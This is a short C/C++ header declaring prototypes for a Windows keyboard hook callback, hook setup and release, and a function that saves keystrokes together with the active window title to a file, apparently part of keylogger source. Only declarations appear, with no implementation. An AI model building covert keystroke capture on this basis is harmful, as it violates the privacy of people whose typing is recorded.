#pragma once
// Function Prototypes
LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam);
void SetHook();
void ReleaseHook();
int Save(DWORD key_stroke, char *file, char* cWindow);